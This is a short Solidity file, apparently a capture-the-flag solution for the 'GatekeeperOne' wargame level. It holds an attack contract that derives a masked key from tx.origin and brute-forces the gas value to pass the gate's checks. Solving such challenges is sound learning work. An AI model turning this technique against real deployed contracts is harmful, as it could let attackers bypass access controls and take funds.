// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./GatekeeperOne.sol";

contract AttackGatekeeperOne {
    GatekeeperOne public gate;

    constructor(address gate_) {
        gate = GatekeeperOne(gate_);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        // use for loop to find the proper gas value
        for (uint256 i = 0; i < 888; i++) {
            try gate.enter{gas: 8191 * 6 + i}(key) {
                console2.log(i);
                break;
            } catch {}
        }
    }
}
